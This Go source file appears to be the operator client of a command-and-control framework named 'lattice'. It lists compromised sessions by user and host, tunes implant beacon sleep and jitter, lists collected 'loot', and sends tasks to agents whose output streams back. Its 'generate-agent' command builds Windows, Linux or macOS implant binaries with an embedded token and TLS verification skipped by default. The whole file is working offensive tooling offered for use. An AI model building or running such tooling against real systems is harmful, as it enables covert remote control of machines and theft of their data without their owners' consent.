package main

import (
	"context"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"connectrpc.com/connect/v2"
	"connectrpc.com/connect/v2/connecthttp"

	"github.com/digitizables/lattice/client/console"
	operatorv1 "github.com/digitizables/lattice/gen/lattice/operator/v1"
	"github.com/digitizables/lattice/gen/lattice/operator/v1/operatorv1connect"
)

func main() {
	if len(os.Args) < 2 {
		console.Usage()
		os.Exit(2)
	}

	baseURL := envOr("LATTICE_API_URL", "http://127.0.0.1:8080")
	rpc := newOperatorClient(baseURL)

	switch os.Args[1] {
	case "login":
		if len(os.Args) != 4 {
			fmt.Fprintln(os.Stderr, "usage: client login <user> <pass>")
			os.Exit(2)
		}
		ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
		defer cancel()
		res, err := rpc.Login(ctx, &operatorv1.LoginRequest{
			Username: os.Args[2],
			Password: os.Args[3],
		})
		if err != nil {
			fail(err)
		}
		fmt.Println(res.GetAccessToken())
		fmt.Fprintf(os.Stderr, "expires_in=%ds user=%s\n", res.GetExpiresInSeconds(), res.GetUsername())
		fmt.Fprintln(os.Stderr, `export LATTICE_OPERATOR_TOKEN=<token>   # bash`)
		fmt.Fprintln(os.Stderr, `$env:LATTICE_OPERATOR_TOKEN="<token>"  # PowerShell`)
	case "logout":
		if strings.TrimSpace(os.Getenv("LATTICE_OPERATOR_TOKEN")) == "" {
			fmt.Fprintln(os.Stderr, "LATTICE_OPERATOR_TOKEN is not set")
			os.Exit(2)
		}
		ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
		defer cancel()
		if _, err := rpc.Logout(ctx, &operatorv1.LogoutRequest{}); err != nil {
			fail(err)
		}
		fmt.Println("logged out")
		fmt.Fprintln(os.Stderr, "unset LATTICE_OPERATOR_TOKEN (or clear $env:LATTICE_OPERATOR_TOKEN)")
	case "listeners":
		ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
		defer cancel()
		res, err := rpc.ListListeners(ctx, &operatorv1.ListListenersRequest{})
		if err != nil {
			fail(err)
		}
		if len(res.GetListeners()) == 0 {
			fmt.Println("no listeners")
			return
		}
		for _, l := range res.GetListeners() {
			tls := "off"
			if l.GetTls() {
				tls = "on"
			}
			fmt.Printf("%s  %s  bind=%s  tls=%s  status=%s  version=%s\n",
				l.GetName(), l.GetKind(), l.GetBind(), tls, l.GetStatus(), l.GetVersion())
		}
	case "reload-extensions":
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		defer cancel()
		res, err := rpc.ReloadExtensions(ctx, &operatorv1.ReloadExtensionsRequest{})
		if err != nil {
			fail(err)
		}
		fmt.Printf("started=%v\n", res.GetStarted())
	case "sessions":
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		defer cancel()
		query := ""
		if len(os.Args) > 2 {
			query = strings.Join(os.Args[2:], " ")
		}
		var token string
		var shown int
		for {
			res, err := rpc.ListSessions(ctx, &operatorv1.ListSessionsRequest{
				PageSize:  100,
				PageToken: token,
				Query:     query,
			})
			if err != nil {
				fail(err)
			}
			if shown == 0 {
				fmt.Printf("total=%d active=%d\n", res.GetTotalCount(), res.GetActiveCount())
			}
			if len(res.GetSessions()) == 0 && shown == 0 {
				fmt.Println("no sessions")
				return
			}
			for _, s := range res.GetSessions() {
				line := fmt.Sprintf("%s  %s  %s/%s  last_seen=%s  sleep=%d",
					s.GetAgentId(), userAtHost(s.GetUsername(), s.GetHostname()), s.GetOs(), s.GetArch(),
					s.GetLastSeen().AsTime().UTC().Format(time.RFC3339),
					s.GetSleepSeconds(),
				)
				if s.GetJitterPercent() > 0 {
					line += fmt.Sprintf(" jitter=%d%%", s.GetJitterPercent())
				}
				if note := strings.TrimSpace(s.GetNote()); note != "" {
					line += " note=" + strconv.Quote(note)
				}
				if feats := s.GetFeatures(); len(feats) > 0 {
					line += " features=" + strings.Join(feats, ",")
				}
				fmt.Println(line)
				shown++
			}
			token = res.GetNextPageToken()
			if token == "" {
				return
			}
		}
	case "note":
		if len(os.Args) < 4 {
			fmt.Fprintln(os.Stderr, "usage: client note <agent_id> <text...>")
			os.Exit(2)
		}
		ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
		defer cancel()
		res, err := rpc.SetSessionNote(ctx, &operatorv1.SetSessionNoteRequest{
			AgentId: os.Args[2],
			Note:    strings.Join(os.Args[3:], " "),
		})
		if err != nil {
			fail(err)
		}
		s := res.GetSession()
		fmt.Printf("%s note=%s\n", s.GetAgentId(), strconv.Quote(s.GetNote()))
	case "sleep":
		if len(os.Args) < 4 || len(os.Args) > 5 {
			fmt.Fprintln(os.Stderr, "usage: client sleep <agent_id> <seconds> [jitter_percent]")
			os.Exit(2)
		}
		secs, err := strconv.ParseUint(os.Args[3], 10, 64)
		if err != nil {
			fail(fmt.Errorf("seconds: %w", err))
		}
		var jitter uint64
		if len(os.Args) == 5 {
			jitter, err = strconv.ParseUint(os.Args[4], 10, 32)
			if err != nil {
				fail(fmt.Errorf("jitter_percent: %w", err))
			}
			if jitter > 100 {
				fail(fmt.Errorf("jitter_percent must be 0-100"))
			}
		}
		ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
		defer cancel()
		res, err := rpc.SetAgentSleep(ctx, &operatorv1.SetAgentSleepRequest{
			AgentId:       os.Args[2],
			SleepSeconds:  secs,
			JitterPercent: uint32(jitter),
		})
		if err != nil {
			fail(err)
		}
		s := res.GetSession()
		fmt.Printf("%s desired_sleep=%d desired_jitter=%d%%\n",
			s.GetAgentId(), s.GetDesiredSleepSeconds(), s.GetDesiredJitterPercent())
	case "loot":
		agentID := ""
		if len(os.Args) > 2 {
			agentID = os.Args[2]
		}
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		defer cancel()
		var pageToken string
		var shown int
		for {
			res, err := rpc.ListLoot(ctx, &operatorv1.ListLootRequest{
				AgentId:   agentID,
				PageSize:  100,
				PageToken: pageToken,
			})
			if err != nil {
				fail(err)
			}
			if shown == 0 {
				fmt.Printf("total=%d\n", res.GetTotalCount())
			}
			if len(res.GetItems()) == 0 && shown == 0 {
				fmt.Println("no loot")
				return
			}
			for _, it := range res.GetItems() {
				fmt.Printf("%s  agent=%s  name=%s  size=%d  sha256=%s  created=%s\n",
					it.GetLootId(), it.GetAgentId(), it.GetName(), it.GetSize(), it.GetSha256(),
					it.GetCreatedAt().AsTime().UTC().Format(time.RFC3339),
				)
				shown++
			}
			pageToken = res.GetNextPageToken()
			if pageToken == "" {
				return
			}
		}
	case "generate-agent":
		runGenerateAgent(rpc, os.Args[2:])
	case "task":
		if len(os.Args) < 4 {
			fmt.Fprintln(os.Stderr, "usage: client task <agent_id> <name> [args...]")
			os.Exit(2)
		}
		agentID := os.Args[2]
		name := os.Args[3]
		args := os.Args[4:]

		ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
		defer cancel()

		stream, err := rpc.StreamEvents(ctx, &operatorv1.StreamEventsRequest{AgentId: agentID})
		if err != nil {
			fail(err)
		}
		defer stream.Close()

		res, err := rpc.SubmitTask(ctx, &operatorv1.SubmitTaskRequest{
			AgentId: agentID,
			Name:    name,
			Args:    args,
		})
		if err != nil {
			fail(err)
		}
		taskID := res.GetTaskId()
		fmt.Println(taskID)

		for {
			ev, err := stream.Receive()
			if err == io.EOF {
				fail(fmt.Errorf("stream ended before task %s completed", taskID))
			}
			if err != nil {
				fail(err)
			}
			tu := ev.GetTaskUpdated()
			if tu == nil || tu.GetTaskId() != taskID {
				continue
			}
			fmt.Printf("status=%s\n", tu.GetStatus())
			if tu.GetStatus() != "completed" && tu.GetStatus() != "failed" {
				continue
			}
			if tu.GetStdout() != "" {
				fmt.Print(tu.GetStdout())
				if tu.GetStdout()[len(tu.GetStdout())-1] != '\n' {
					fmt.Println()
				}
			}
			if tu.GetStderr() != "" {
				fmt.Fprint(os.Stderr, tu.GetStderr())
				if tu.GetStderr()[len(tu.GetStderr())-1] != '\n' {
					fmt.Fprintln(os.Stderr)
				}
			}
			if tu.GetExitCode() != 0 {
				os.Exit(int(tu.GetExitCode()))
			}
			return
		}
	default:
		console.Usage()
		os.Exit(2)
	}
}

func runGenerateAgent(rpc operatorv1connect.OperatorServiceClient, args []string) {
	fs := flag.NewFlagSet("generate-agent", flag.ExitOnError)
	server := fs.String("server", "https://127.0.0.1:8443", "agent callback URL")
	goos := fs.String("os", "", "target GOOS (windows|linux|darwin; default host)")
	arch := fs.String("arch", "", "target GOARCH (amd64|arm64; default host)")
	sleep := fs.Uint64("sleep", 5, "sleep seconds")
	jitter := fs.Uint("jitter", 0, "jitter percent 0-100")
	insecure := fs.Bool("insecure", true, "bake insecure TLS skip-verify")
	embedToken := fs.Bool("embed-token", true, "embed teamserver agent token into the build")
	outName := fs.String("o", "", "local output filename (also sent as output_name)")
	_ = fs.Parse(args)

	if strings.TrimSpace(os.Getenv("LATTICE_OPERATOR_TOKEN")) == "" {
		fmt.Fprintln(os.Stderr, "generate-agent via RPC requires LATTICE_OPERATOR_TOKEN (login first)")
		fmt.Fprintln(os.Stderr, "or run locally: go run ./server/cmd/generate-agent")
		os.Exit(2)
	}

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Minute)
	defer cancel()
	res, err := rpc.GenerateAgent(ctx, &operatorv1.GenerateAgentRequest{
		ServerUrl:       *server,
		Os:              *goos,
		Arch:            *arch,
		SleepSeconds:    *sleep,
		JitterPercent:   uint32(*jitter),
		InsecureTls:     *insecure,
		EmbedAgentToken: *embedToken,
		OutputName:      *outName,
	})
	if err != nil {
		fail(err)
	}
	fmt.Printf("server_path=%s os=%s arch=%s size=%d sha256=%s\n",
		res.GetPath(), res.GetOs(), res.GetArch(), res.GetSize(), res.GetSha256())
	data := res.GetData()
	if len(data) == 0 {
		fmt.Fprintln(os.Stderr, "no binary bytes in response; use server_path on the teamserver host")
		return
	}
	local := strings.TrimSpace(*outName)
	if local == "" {
		local = filepath.Base(res.GetPath())
		if local == "" || local == "." || local == "/" {
			local = fmt.Sprintf("agent-%s-%s", res.GetOs(), res.GetArch())
			if res.GetOs() == "windows" {
				local += ".exe"
			}
		}
	}
	if err := os.WriteFile(local, data, 0o755); err != nil {
		fail(err)
	}
	fmt.Printf("wrote %s (%d bytes)\n", local, len(data))
}

func newOperatorClient(baseURL string) operatorv1connect.OperatorServiceClient {
	token := strings.TrimSpace(os.Getenv("LATTICE_OPERATOR_TOKEN"))
	httpClient := &http.Client{
		Transport: &bearerRoundTripper{
			base:  http.DefaultTransport,
			token: token,
		},
	}
	return operatorv1connect.NewOperatorServiceClient(
		connect.NewClient(connecthttp.NewTransport(httpClient, baseURL)),
	)
}

type bearerRoundTripper struct {
	base  http.RoundTripper
	token string
}

func (t *bearerRoundTripper) RoundTrip(req *http.Request) (*http.Response, error) {
	base := t.base
	if base == nil {
		base = http.DefaultTransport
	}
	if t.token == "" {
		return base.RoundTrip(req)
	}
	r := req.Clone(req.Context())
	r.Header.Set("Authorization", "Bearer "+t.token)
	return base.RoundTrip(r)
}

func fail(err error) {
	fmt.Fprintln(os.Stderr, err)
	os.Exit(1)
}

func envOr(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

func userAtHost(username, hostname string) string {
	user := username
	if idx := strings.LastIndex(username, `\`); idx >= 0 {
		domain := username[:idx]
		account := username[idx+1:]
		if hostname != "" && strings.EqualFold(domain, hostname) && account != "" {
			user = account
		}
	}
	if hostname == "" {
		return user
	}
	if user == "" {
		return hostname
	}
	return user + "@" + hostname
}
